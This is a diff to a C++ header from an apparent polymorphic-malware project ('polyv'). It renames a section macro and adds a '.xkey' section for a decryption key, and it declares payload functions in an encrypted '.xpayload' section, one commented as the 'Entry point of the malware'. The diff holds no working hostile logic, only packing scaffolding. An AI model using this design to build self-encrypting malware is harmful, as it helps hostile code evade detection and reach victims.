@@ -1,7 +1,10 @@
 #pragma once
 
 /// Attribute describing a crypted function in the xpayload section
-#define POLYV_XPAYLOAD_SECTION __attribute__ ((section (".xpayload")))
+#define POLYV_SECTION_XPAYLOAD __attribute__ ((section (".xpayload")))
+/// Attribute describing an object inside the .xkey section
+#define POLYV_SECTION_XKEY __attribute__ ((section (".xkey")))
+
 // Signals that a function cannot be accesed before decrypting the .xpayload section
 #define POLYV_ENCRYPTED
 
@@ -17,16 +20,19 @@ namespace polyv::hidden                         \
                                                 \
 } // namespace polyv::hidden
 
-/// Contains all code that will be crypted 
+/// Contains all code that will be crypted
 namespace polyv::hidden {
 
-/// Function used as a label to declare the beginning of the crypted section
-int POLYV_ENCRYPTED payload_beg() POLYV_XPAYLOAD_SECTION;
+/// Global key used for decryption
+static unsigned char* key POLYV_SECTION_XKEY;
 
-/// Entry point of the malware, mut be at the top of .cpp file in hidden_code
-int POLYV_ENCRYPTED payload(int argc, char* argv[]) POLYV_XPAYLOAD_SECTION;
+/// Function used as a label to declare the beginning of the crypted section
+int POLYV_ENCRYPTED payload_beg() POLYV_SECTION_XPAYLOAD;
+
+/// Entry point of the malware
+int POLYV_ENCRYPTED payload(int argc, char* argv[]) POLYV_SECTION_XPAYLOAD;
 
 /// Function used as a label to declare the end of the crypted section
-int POLYV_ENCRYPTED payload_end() POLYV_XPAYLOAD_SECTION;
+int POLYV_ENCRYPTED payload_end() POLYV_SECTION_XPAYLOAD;
 
 } // namespace polyv::hidden
